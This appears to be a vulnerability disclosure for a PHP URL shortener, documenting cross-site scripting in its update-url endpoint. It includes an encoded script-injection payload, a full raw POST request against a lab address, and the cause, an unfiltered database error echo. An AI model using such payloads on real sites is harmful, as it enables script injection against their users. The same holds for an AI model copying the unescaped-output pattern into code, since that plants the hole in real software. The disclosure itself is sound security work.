# URL Shortener update long_url has xss

BUG_Author: gk66

vendors: https://www.sourcecodester.com/php/16971/url-shortener-using-php-source-code.html

Vulnerability File: endpoint\update-url.php

[+] payload: long_url%3Dhttp%3A%2F%2Fwww.example.com--%3E%3CScRiPt%20%3Ealert(%22xss%22)%3C%2FScRiPt%3E%3C!--

```
POST /url-shortener/endpoint/update-url.php HTTP/1.1
Host: 192.168.150.138
Content-Length: 122
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.150.138
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.150.138/url-shortener/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

tbl_url_id=1&short_url=axrVKB&long_url=http%3A%2F%2Fwww.example.com--%3E%3CScRiPt%20%3Ealert(%22xss%22)%3C%2FScRiPt%3E%3C!--
```

![image-2](https://github.com/bluegaoke/Security-Vulnerability/blob/main/4.png)

![image-3](https://github.com/bluegaoke/Security-Vulnerability/blob/main/3.png)

Causes of vulnerabilities :

endpoint\update-url.php -> line32 -> echo 'Database Error: ' . $e->getMessage();

echo error message without filtering resulted in xss